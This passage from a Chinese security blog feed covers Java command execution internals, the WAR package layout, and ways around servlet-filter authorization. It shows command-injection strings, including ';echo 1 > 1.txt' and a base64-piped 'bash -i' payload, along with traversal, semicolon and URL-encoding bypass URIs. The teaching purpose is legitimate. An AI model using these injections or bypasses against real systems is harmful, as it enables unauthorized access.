cmdarray。可以证实 Runtime.getRuntime.exec() 的底层实际上也是 ProcessBuilder。</p><p>跟进 ProcessBuilder 中的 start 方法</p><p>java.lang.ProcessBuilder#start</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153743651.png" alt="image-20231107153743651"></p><p>ProcessBuilder.start 内部又调用了 ProcessImpl.start</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342702722.png" alt="1699342702722"></p><p>在 ProcessImpl.start 中 将 cmdarry 第一个参数 (cmdarry[0]) 当作要执行的命令，把后面的部分 (cmdarry[1:]) 作为命令执行的参数转换成 byte 数组 argBlock。</p><p>最后将处理好的参数传给 UNIXProcess</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342722365.png" alt="1699342722365"></p><p>java.lang.UNIXProcess#UNIXProcess</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342745884.png" alt="1699342745884"></p><p>我们看到当前断点的 pid 是 3229 , 这里确实启动了一个 ping 进程</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342771506.png" alt="1699342771506"></p><p>此时 prog 是要执行的命令 ping , argBlock 都是传给 ping 的参数 127.0.0.1\x00;echo\x001\x00&gt;\x001.txt</p><p>经过 StringTokenizer 对字符串的处理，命令执行的语义发生了改变，并不是最初设定的想法。</p><p>StringTokenizer会根据空格将我们的命令划分为数组，那么我们的命令会被划分为{“&#x2F;bin&#x2F;sh”,”-c”,””echo”,”111”,”&gt;”,”3.txt””}，那么整个命令就变味了，达不到我们想要的效果。</p><h2 id="Runtime-getRuntime-exec-String-cmdarray"><a href="#Runtime-getRuntime-exec-String-cmdarray" class="headerlink" title="Runtime.getRuntime().exec(String cmdarray[])"></a>Runtime.getRuntime().exec(String cmdarray[])</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">linux_cmd</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;;echo 1 &gt; 1.txt&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ping 127.0.0.1&quot;</span>+cmd;<br>        <span class="hljs-comment">//Runtime.getRuntime().exec(Command);</span><br>        Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, Command&#125;);<br>    &#125;<br>&#125;<br><br>JAVA<br></code></pre></td></tr></table></figure><p>我们传入数组，进行分析，因为直接传入的是数组，所以没有经过 StringTokenizer 对字符串的处理</p><p>java.lang.Runtime#exec(java.lang.String[])</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342802457.png" alt="1699342802457"></p><p>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342825194.png" alt="1699342825194"></p><p>java.lang.UNIXProcess#UNIXProcess</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342841087.png" alt="1699342841087"></p><p>此时 prog 是要执行的命令 &#x2F;bin&#x2F;sh , argBlock 都是传给 ping 的参数 -c\x00”ping 127.0.0.1;echo 1 &gt; 1.txt”</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><a href="https://www.adminxe.com/tools/code.html">java.lang.Runtime.exec() Payload Workarounds - @Adminxe</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">linux_cmd</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;<br>        Runtime.getRuntime().exec(Command);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>java.lang.Runtime#exec(java.lang.String)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342903198.png" alt="1699342903198"></p><p>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342924318.png" alt="1699342924318"></p><p>java.lang.UNIXProcess#UNIXProcess</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/1699342940503.png" alt="1699342940503"></p><p>此时 prog 是要执行的命令 bash , argBlock 都是传给 ping 的参数 -c\x00{echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA&#x3D;&#x3D;}|{base64,-d}|{bash,-i}</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>war包的目录结构</title>
    <link href="/2023/11/07/war%E5%8C%85%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
    <url>/2023/11/07/war%E5%8C%85%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>WAR(Web Archivefile)网络应用程序文件，是与平台无关的文件格式，它允许将许多文件组合成一个压缩文件。</p><p>WAR包标准目录结构:</p><p><img src="/2023/11/07/war%E5%8C%85%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/1699338586904.png" alt="1699338586904"></p><p>1、index.jsp[可选]</p><p>2、METAINF[MAVEN自动生成目录]</p><p>3、WEB-INF[必含]</p><p>①classes目录:存放Java类文件</p><p>②lib目录：所需要的jar包</p><p>③web.xml：war的描述文件，保存路由和类（class目录下）的映射关系</p><p><code>servlet-name</code> 是一个在 Java Web应用程序的<code>web.xml</code>文件（Web应用程序的部署描述文件）中定义的元素，用于指定一个Servlet的名称。</p><p>Servlet是Java Web应用程序中处理HTTP请求的一种Java程序，通常用于生成动态网页内容、处理表单提交、与数据库交互等。每个Servlet在Web应用程序中都需要有一个唯一的名称，这个名称在<code>web.xml</code>文件中使用<code>&lt;servlet-name&gt;</code>元素来定义。</p><p><code>servlet-class</code> 是一个在 Java Web 应用程序的 <code>web.xml</code> 文件中定义的元素，用于指定一个 Servlet 的 Java 类名。</p><p>Servlet 是 Java Web 应用程序中的一种 Java 程序，它通常用于处理 HTTP 请求和生成动态的 Web 内容。每个 Servlet 需要有一个与其相关联的 Java 类，该类包含 Servlet 的实现代码。<code>servlet-class</code> 元素用于指定这个 Servlet 类的完全限定类名（fully qualified class name）。</p><p>4、subdirectories[可选目录]</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">  存放一些网页和照片，如：html,jsp,js,jpg等等。<br><span class="hljs-built_in">TEXT</span><br></code></pre></td></tr></table></figure><p><strong>转载自：<a href="https://blog.51cto.com/u_15322177/5105169">https://blog.51cto.com/u_15322177/5105169</a></strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>filter设计缺陷导致的权限绕过</title>
    <link href="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <url>/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="1-1-权限控制的本质"><a href="#1-1-权限控制的本质" class="headerlink" title="1.1 权限控制的本质"></a>1.1 权限控制的本质</h2><p>一般来说，为了防止越权操作，通常会结合filter进⾏相关接⼝的鉴权操作。其中不不外乎就是对每⼀个接口（通俗来说就是我们的URI&#x2F;URL）进行业务梳理，然后判断当前URI&#x2F;URL是否具有相应的业务权限。</p><h2 id="1-2-常见权限控制的实现"><a href="#1-2-常见权限控制的实现" class="headerlink" title="1.2 常见权限控制的实现"></a>1.2 常见权限控制的实现</h2><p>一般情况下，通常是获取到当前URI&#x2F;URL，然后跟需要鉴权的接口进行⽐对，或者直接结合startsWith()或者endsWith()方法，设置对应的校验名单。</p><p>例如下⾯的过滤器实现，以&#x2F;login开头的不需要校验(登陆业务每个人都可以访问)，所有.do&#x2F;.action结尾的接⼝均需要做登陆检查，防止未授权访问等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><span class="hljs-keyword">if</span>(uri.endsWith(<span class="hljs-string">&quot;.do&quot;</span>)||uri.endsWith(<span class="hljs-string">&quot;.action&quot;</span>)) &#123;<br><span class="hljs-comment">//检测当前用户是否登陆</span><br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span>(User) request.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-keyword">if</span>(user==<span class="hljs-literal">null</span>|| <span class="hljs-string">&quot;&quot;</span>.equals(user)) &#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;未授权访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是，在Java中获取当前request中的URI&#x2F;URL通常会使用<code>request.getRequestURL()</code>和<code>request.getRequestURI()</code>这两个方法，但是如果没有进⾏相关的处理的话，有可能导致权限控制绕过的风险。</p><h2 id="1-3-绕过方式"><a href="#1-3-绕过方式" class="headerlink" title="1.3 绕过方式"></a>1.3 绕过方式</h2><p>当权限过滤器获取当前request中的URI&#x2F;URL使用request.getRequestURL()和request.getRequestURI()这两个方法时，可以考虑以下三种⽅式进行权限绕过：</p><h3 id="1-3-1-非标准化绕过"><a href="#1-3-1-非标准化绕过" class="headerlink" title="1.3.1 非标准化绕过"></a>1.3.1 非标准化绕过</h3><p>相关场景：</p><p>例如&#x2F;system&#x2F;login开头的接口是白名单，不需要进行访问控制（登陆页面所有人都可以访问），其他接⼝都需要</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><span class="hljs-keyword">if</span>(uri.startsWith(<span class="hljs-string">&quot;/system/login&quot;</span>)) &#123;<br><span class="hljs-comment">//登陆接口设置⽩白名单</span><br>filterChain.doFilter(request, response);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(uri.endsWith(<span class="hljs-string">&quot;.do&quot;</span>)||uri.endsWith(<span class="hljs-string">&quot;.action&quot;</span>)) &#123;<br><span class="hljs-comment">//检测当前⽤户是否登陆</span><br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span>(User) request.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-keyword">if</span>(user==<span class="hljs-literal">null</span>|| <span class="hljs-string">&quot;&quot;</span>.equals(user)) &#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;未授权访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关效果如下：</p><p>当未登录直接访问UserInfoSearch.do接口时，显示未授权访问：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699336743392.png" alt="1699336743392"></p><p>相关原理：</p><p>中间件在进⾏解析时，会对我们URI中的..&#x2F;进行相关处理从⽽得到相关的servlet。也就是说尝试对我们访问的URL引入..&#x2F;，中间件是可以正常解析并完成正常业务的，以tomcat中的examples目录中的案例servlet访问为例，尝试访问一个不存在的目录login，然后通过..&#x2F;回到正常目录下，正常解析：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699336790436.png" alt="1699336790436"></p><p>绕过分析：</p><p>使用request.getRequestURL()和request.getRequestURI()这两个方法进⾏访问接口的获取时，是不会对类似..&#x2F;等进⾏规范化处理的，也就是说刚刚我们访问的&#x2F;system&#x2F;login&#x2F;..&#x2F;UserInfoSearch.do际获取到的URI为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">request.getRquestURI<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=/</span>system/login/../UserInfoSearch.do<br></code></pre></td></tr></table></figure><p>同样是前⾯的例子，那么我们可以通过在URI中写⼊&#x2F;login&#x2F;..&#x2F;,使得权限过滤器认为我们当前访问的接⼝为白名单接口，从而绕过权限控制，使得系统认为我们当前访问的接⼝是登陆login，不需要进行权限校验：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699336894504.png" alt="1699336894504"></p><p>绕过方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在URI引⼊入类似/login（白名单接口，可以通过测试得出，一般登陆都是不需要权限校验的）/../的<br>样式，伪造⽩名单接口。<br></code></pre></td></tr></table></figure><h3 id="1-3-2-URL截断绕过"><a href="#1-3-2-URL截断绕过" class="headerlink" title="1.3.2 URL截断绕过"></a>1.3.2 URL截断绕过</h3><p>相关场景：</p><p>例如&#x2F;system&#x2F;login开头的接⼝是⽩名单，不需要进行访问控制（登陆⻚面所有人都可以访问），其他接口都需要进行登陆检查，防止未授权访问，但是考虑到了..&#x2F;的非法访问问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><span class="hljs-keyword">if</span>(uri.contains(<span class="hljs-string">&quot;./&quot;</span>))&#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;⾮非法访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(uri.startsWith(<span class="hljs-string">&quot;/system/login&quot;</span>)) &#123;<br><span class="hljs-comment">//登陆接口设置⽩白名单</span><br>filterChain.doFilter(request, response);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(uri.endsWith(<span class="hljs-string">&quot;.do&quot;</span>)||uri.endsWith(<span class="hljs-string">&quot;.action&quot;</span>)) &#123;<br><span class="hljs-comment">//检测当前用户是否登陆</span><br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span>(User) request.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-keyword">if</span>(user==<span class="hljs-literal">null</span>|| <span class="hljs-string">&quot;&quot;</span>.equals(user)) &#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;未授权访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关效果如下：</p><p>当未登录直接访问UserInfoSearch.do接⼝时，显示未授权访问：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699336985644.png" alt="1699336985644"></p><p>尝试结合..&#x2F;伪造白名单，失败：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699336999321.png" alt="1699336999321"></p><p>相关原理:</p><p>URL中有一个保留字符分号（;），主要作为参数分隔符进行使用，有时候是请求中传递的参数太多了，所以使用分号（;）将参数对（key&#x3D;value）连接起来作为一个请求参数进⾏传递。</p><p>直接在URI中引入分隔符，正常来说是不会对实际接口的访问造成影响的。</p><p>绕过分析：</p><p>对于request.getRequestURL()和request.getRequestURI()来说，使用&amp;连接的参数键值对，其是获取不到的，但是参数分隔符（;）及内容是可以获取到的：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">request.getRquestURI<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=/</span>system/UserInfoSearch.do<span class="hljs-comment">;tkswifty</span><br></code></pre></td></tr></table></figure><p>同样是前面的例子,访问.do结尾的接口需要进行登陆检查，否则认为未授权访问，那么此时可以利用分隔符，绕过endsWith()检测，使得权限过滤器认为我们访问的接口不是业务接口，从而达到绕过权限控制的效果：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337103779.png" alt="1699337103779"></p><p>绕过⽅法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">在URI引⼊入参数分隔符;，进⾏切割URI绕过限制，例例<br>如/system;Bypass/UserSearch.do;Bypass<br></code></pre></td></tr></table></figure><h3 id="1-3-3-URL编码绕过"><a href="#1-3-3-URL编码绕过" class="headerlink" title="1.3.3 URL编码绕过"></a>1.3.3 URL编码绕过</h3><p>相关场景：</p><p>例如&#x2F;system&#x2F;UserInfoSearch.do接⼝是管理员才能访问的接口，需要进⾏⽤户检查，防止越权访问：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(uri.equals(<span class="hljs-string">&quot;/system/UserInfoSearch.do&quot;</span>))&#123;<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span>(User) request.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">role</span> <span class="hljs-operator">=</span> user.getRole();<br><span class="hljs-keyword">if</span>(role.equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br><span class="hljs-comment">//当前⽤用户为admin，允许访问该接⼝</span><br>filterChain.doFilter(request, response);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;越权访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关效果如下：</p><p>若不是admin用户登陆，拒绝访问UserInfoSearch.do接口：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337158602.png" alt="1699337158602"></p><p>否则返回当前系统存在的用户名：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337174634.png" alt="1699337174634"></p><p>相关原理：</p><p>当filter处理完相关的流程后，中间件会对请求的URL进行一次URL解码操作，然后再找到对应的Servlet进行访问。</p><p>也就是说尝试对我们访问的URL进行一次URL编码，中间件是可以正常解析并完成正常业务的，以tomcat中的examples⽬目录中的案例servlet访问为例，尝试将HelloWorldExample进行URL编码再进行访问，正常解析：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337196278.png" alt="1699337196278"></p><p>绕过分析：</p><p>除了前面介绍的两种方式以外，这里存在一个问题，使用request.getRequestURL()和request.getRequestURI()这两个⽅法进⾏行行访问接口的获取时，是不会进行URL解码操作的，也就是说刚刚我们访问的</p><p><code>/system/%55%73%65%72%49%6e%66%6f%53%65%61%72%63%68%2e%64%6f</code>实际获取到的URI为：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">request.getRquestURI====/<span class="hljs-keyword">system</span>/%55%73%65%72%49%6e%66%6f%53%65%61%72%63%68%2e%64%6f<br></code></pre></td></tr></table></figure><p>那么我们可以通过对URI进行URL编码，此时filter中得到的uri并不是正常的&#x2F;system&#x2F;UserInfoSearch.do,⽽是编码后的，但是filter转发请求后浏览器可以解码并正常解析，从而达到以低权限用户绕过权限控制访问管理员接口的效果：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337321710.png" alt="1699337321710"></p><p>绕过⽅法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">对URI进行<span class="hljs-built_in">URL</span>编码/多重<span class="hljs-built_in">URL</span>编码，尝试绕过。<br></code></pre></td></tr></table></figure><h3 id="1-3-4-Spring-Web的动态Controller追加-绕过"><a href="#1-3-4-Spring-Web的动态Controller追加-绕过" class="headerlink" title="1.3.4 Spring Web的动态Controller追加&#x2F;绕过"></a>1.3.4 Spring Web的动态Controller追加&#x2F;绕过</h3><p>相关场景：</p><p>一般情况下，通常是获取到当前URI&#x2F;URL，然后跟需要鉴权的接⼝进行比对，结合endsWith()方法，设置对应的校验名单。</p><p>例如下面的过滤器实现，所有.do、.action结尾的接口均需要做登陆检查，防⽌止未授权访问等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getServletPath()+(request.getPathInfo() == <span class="hljs-literal">null</span> ?<br><span class="hljs-string">&quot;&quot;</span> : request.getPathInfo());<br><span class="hljs-keyword">if</span>(uri.endsWith(<span class="hljs-string">&quot;.do&quot;</span>)||uri.endsWith(<span class="hljs-string">&quot;.action&quot;</span>)) &#123;<br><span class="hljs-comment">//检测当前用户是否登陆</span><br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span>(User) request.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-keyword">if</span>(user==<span class="hljs-literal">null</span>|| <span class="hljs-string">&quot;&quot;</span>.equals(user)) &#123;<br>errorResponse(response, paramN, <span class="hljs-string">&quot;未授权访问&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关原理：</p><p>特定情况下，Spring web在匹配url接⼝的时候会容错后⾯额外的&#x2F;。</p><p>以Spring MVC为例例，如下配置的话，在实际接口访问的时候会容错后⾯额外的&#x2F;：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>SpringMVC<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>例如以下两种访问方式效果都是一样的:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">info</span>.<span class="hljs-keyword">do</span>?param=<span class="hljs-keyword">value</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">info</span>.<span class="hljs-keyword">do</span>/?param=<span 